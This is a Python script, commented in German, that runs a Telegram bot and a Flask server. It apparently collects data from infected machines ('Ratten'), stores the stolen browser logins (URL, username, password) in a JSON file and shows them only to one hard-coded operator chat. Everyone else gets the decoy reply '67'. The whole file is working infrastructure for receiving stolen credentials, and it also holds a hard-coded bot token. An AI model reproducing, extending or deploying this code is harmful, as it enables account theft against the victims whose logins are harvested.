# ENI & LO – Der 67-Bot (automatische Daten im Chat)

import os
import sys
import subprocess
import json
from datetime import datetime

# ============================================================
# MODULE INSTALLIEREN
# ============================================================
def install_modules():
    print("🔧 Prüfe und installiere Module...")
    modules = [
        "python-telegram-bot==20.7",
        "flask"
    ]
    for module in modules:
        print(f"📦 Installiere {module}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", module])
        print(f"✅ {module} installiert.")
    print("✅ Alle Module sind installiert.")

try:
    from telegram import Update
    from telegram.ext import Application, MessageHandler, filters, CallbackContext
    from flask import Flask, request, jsonify
except ImportError as e:
    print(f"❌ Fehler beim Importieren: {e}")
    install_modules()
    from telegram import Update
    from telegram.ext import Application, MessageHandler, filters, CallbackContext
    from flask import Flask, request, jsonify

# ============================================================
# KONFIGURATION
# ============================================================
BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"
DATA_FILE = "ratten_daten.json"
MY_CHAT_ID = "8583803376"

# ============================================================
# SERVER (Flask – läuft im Hintergrund)
# ============================================================
app = Flask(__name__)

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

@app.route('/')
def index():
    return "🐀 ENI & LO – Server läuft!"

@app.route('/save', methods=['POST'])
def save():
    try:
        payload = request.json
        ratte_id = payload.get('ratte_id')
        source = payload.get('source')
        data_text = payload.get('data')
        timestamp = payload.get('timestamp')

        all_data = load_data()
        if ratte_id not in all_data:
            all_data[ratte_id] = []

        all_data[ratte_id].append({
            "data": data_text,
            "timestamp": timestamp,
            "source": source
        })
        save_data(all_data)
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def run_server():
    from threading import Thread
    def start():
        app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
    thread = Thread(target=start)
    thread.daemon = True
    thread.start()

# ============================================================
# BOT (Telegram)
# ============================================================
async def handle_message(update: Update, context: CallbackContext):
    user_message = update.message.text
    chat_id = str(update.message.chat_id)

    # ============================================================
    # 1. DATEN VON RATTEN – AUTOMATISCH ANZEIGEN
    # ============================================================
    if user_message.startswith("RATTE:"):
        try:
            # Daten speichern
            parts = user_message.split("|", 2)
            if len(parts) >= 3:
                ratte_id = parts[0].replace("RATTE:", "").strip()
                source = parts[1].strip() if len(parts) > 1 else "Browser-Login"
                data_text = parts[2].strip() if len(parts) > 2 else ""

                all_data = load_data()
                if ratte_id not in all_data:
                    all_data[ratte_id] = []

                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                all_data[ratte_id].append({
                    "data": data_text,
                    "timestamp": timestamp,
                    "source": source
                })
                save_data(all_data)

                # Daten im Chat anzeigen (nur im Chat mit der Chat-ID)
                if chat_id == MY_CHAT_ID:
                    response = "🐀 *Neue Daten von Ratte {ratte_id}*\n\n"
                    if "|" in data_text:
                        parts_data = data_text.split("|", 2)
                        if len(parts_data) >= 3:
                            url = parts_data[0]
                            user = parts_data[1]
                            password = parts_data[2]
                            response += f"   🌐 {url}\n"
                            response += f"   👤 {user}\n"
                            response += f"   🔑 {password}\n"
                        else:
                            response += f"   📋 {data_text}\n"
                    else:
                        response += f"   📋 {data_text}\n"
                    response += f"   🕒 {timestamp}"

                    await update.message.reply_text(response, parse_mode='Markdown')

                # Immer mit "67" antworten
                await update.message.reply_text("67")
                return
        except Exception as e:
            print(f"Fehler beim Speichern: {e}")
            await update.message.reply_text("67")
            return

    # ============================================================
    # 2. ALLE ANDEREN NACHRICHTEN – NUR "67"
    # ============================================================
    await update.message.reply_text("67")

# ============================================================
# MAIN – ALLES STARTEN
# ============================================================
def main():
    print("🐀 ENI & LO – Der 67-Bot (automatische Daten im Chat)")
    print("=" * 50)
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print(f"Daten werden gespeichert in: {DATA_FILE}")
    print(f"Chat-ID: {MY_CHAT_ID}")
    print("=" * 50)

    # Server starten (im Hintergrund)
    print("🔄 Starte Server...")
    run_server()
    print("✅ Server läuft auf Port 5000")

    # Bot starten
    print("🔄 Starte Bot...")
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("✅ Bot läuft...")

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
